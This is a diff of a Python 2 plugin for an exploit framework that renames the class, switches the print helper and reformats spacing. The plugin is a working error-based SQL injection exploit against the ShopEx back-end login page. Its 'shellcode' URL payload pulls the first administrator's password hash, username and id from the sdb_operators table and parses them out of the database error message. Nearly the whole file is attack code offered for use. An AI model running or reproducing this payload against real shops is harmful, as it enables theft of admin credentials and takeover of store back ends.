@@ -1,5 +1,5 @@
-
-class mstplugin:
+# -*- coding: utf-8-*-
+class NSSPlugin:
 	infos=[
 	['Name','shopex_back_end_SQLInject_exploit'],
 	['Author','L34Rn'],
@@ -17,40 +17,40 @@ class mstplugin:
 	]
 	
 	def exploit(self):
-		host=self.host_reduce_http(HOST)
-		port=PORT
-		path=PATH
-		color.cprint('[*] exploit start OK!',BLUE)
-		color.cprint('[*] [TARGET] '+host,BLUE)
-		if str(host)=='443':
-			_host='https://'+host+path
+		host = self.host_reduce_http(HOST)
+		port = PORT
+		path = PATH
+		pp.prettyPrint('[*] exploit start OK!',BLUE)
+		pp.prettyPrint('[*] [TARGET] '+host,BLUE)
+		if str(host) == '443':
+			_host = 'https://'+host+path
 		else:
-			_host='http://'+host+':'+port+path
+			_host = 'http://'+host+':'+port+path
 		try:
-			color.cprint('[+] Sending Exploit Code ...',BLUE)
-			result=self.SQLi(_host)
-			if result=='Failed':
-				color.cprint('[!] All Done!\n[!] But Failed!',RED)
+			pp.prettyPrint('[+] Sending Exploit Code ...',BLUE)
+			result = self.SQLi(_host)
+			if result == 'Failed':
+				pp.prettyPrint('[!] All Done!\n[!] But Failed!',RED)
 			else:
-				color.cprint('[+] Good News!',GREEN)
-				id,user,hash=result
-				color.cprint('[+] id:		'+id,GREEN)
-				color.cprint('[+] user:	'+user,GREEN)
-				color.cprint('[+] hash:	'+hash,GREEN)
+				pp.prettyPrint('[+] Good News!',GREEN)
+				id,user,hash = result
+				pp.prettyPrint('[+] id:		'+id,GREEN)
+				pp.prettyPrint('[+] user:	'+user,GREEN)
+				pp.prettyPrint('[+] hash:	'+hash,GREEN)
 		except Exception,e:
-			color.cprint('[!] Error=>'+str(e),RED)
-			color.cprint('[!] All Done!\n[!] But Failed!',RED)
+			pp.prettyPrint('[!] Error=>'+str(e),RED)
+			pp.prettyPrint('[!] All Done!\n[!] But Failed!',RED)
 	def SQLi(self,host):
-		shellcode=r"/shopadmin/index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1"
-		url=host+shellcode
-		res=urllib.urlopen(url)
+		shellcode = r"/shopadmin/index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1"
+		url = host+shellcode
+		res = urllib.urlopen(url)
 		if res.getcode()==200:
-			html=res.read()
+			html = res.read()
 			try:
-				rex=re.search(r"(Duplicate entry ')(.{32})~(.*)~(\d*)(' for key 'group_key')",html)
-				hash=rex.group(2)
-				user=rex.group(3)
-				id=rex.group(4)
+				rex = re.search(r"(Duplicate entry ')(.{32})~(.*)~(\d*)(' for key 'group_key')",html)
+				hash = rex.group(2)
+				user = rex.group(3)
+				id = rex.group(4)
 				return id,user,hash
 			except:
 				return 'Failed'
@@ -58,13 +58,13 @@ class mstplugin:
 			return 'Failed'
 			
 	def host_reduce_http(self,host):
-		l=len(host.split('//'))
-		if l==1:
-			host=host.strip()
-			host=host.split('/')[0]
-		elif l==2:
-			host=host.split('//')[1]
-			host=host.split('/')[0]
+		l = len(host.split('//'))
+		if l == 1:
+			host = host.strip()
+			host = host.split('/')[0]
+		elif l == 2:
+			host = host.split('//')[1]
+			host = host.split('/')[0]
 		else:
-			host='Error!'
+			host = 'Error!'
 		return host
